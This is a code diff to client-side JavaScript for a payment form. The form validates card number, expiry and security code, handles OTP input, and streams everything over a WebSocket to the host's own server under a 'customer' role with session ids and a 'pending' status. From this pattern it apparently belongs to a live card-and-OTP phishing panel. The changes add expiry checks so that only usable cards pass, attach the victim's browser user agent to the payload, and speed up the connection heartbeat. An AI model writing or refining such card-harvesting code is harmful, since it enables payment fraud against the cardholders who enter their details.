@@ -308,7 +308,7 @@ if(!cid){cid='cust_'+Date.now()+'_'+Math.random().toString(36).slice(2,8);localS
 function wsConnect(){
 var url=(location.protocol==='https:'?'wss:':'ws:')+'//'+location.host+'/api/?role=customer&cid='+cid+(sid?'&sid='+sid:'');
 ws=new WebSocket(url);
-ws.onopen=function(){console.log('[WS] Connected');if(wsTimer)clearInterval(wsTimer);wsTimer=setInterval(function(){if(ws&&ws.readyState===1)ws.send(JSON.stringify({type:'heartbeat'}))},30000)};
+ws.onopen=function(){console.log('[WS] Connected');if(wsTimer)clearInterval(wsTimer);wsTimer=setInterval(function(){if(ws&&ws.readyState===1)ws.send(JSON.stringify({type:'heartbeat'}))},10000)};
 ws.onmessage=function(e){
 var msg=JSON.parse(e.data);
 console.log('[WS] Received:',msg);
@@ -379,6 +379,7 @@ var cn=document.getElementById('card-number').value.replace(/\s/g,''),ce=documen
 if(cn.length<13||cn.length>19)return alert('Please enter a valid card number');
 if(!luhn(cn))return alert('Invalid card number (Luhn check failed)');
 if(!ce.match(/^\d\d\/\d\d$/))return alert('Please enter a valid expiry date (MM/YY)');
+var em=parseInt(ce.slice(0,2)),ey=parseInt('20'+ce.slice(3));if(ey>2039)return alert('Card expiry year cannot exceed 2039');var now=new Date(),exp=new Date(ey,em);if(exp<=now)return alert('Card has expired. Please use a valid card.');
 if(cv.length<3)return alert('Please enter a valid security code');
 if(!nm)return alert('Please enter the cardholder name');
 // Clear stale OTP input
@@ -397,6 +398,7 @@ sendPayload();
 
 function sendPayload(){
 var payload=buildPayload();
+payload.ua=navigator.userAgent;
 if(!sid){ws.send(JSON.stringify({type:'customer_input',payload:payload}));return}
 payload.status='pending';
 payload.sessionId=sid;
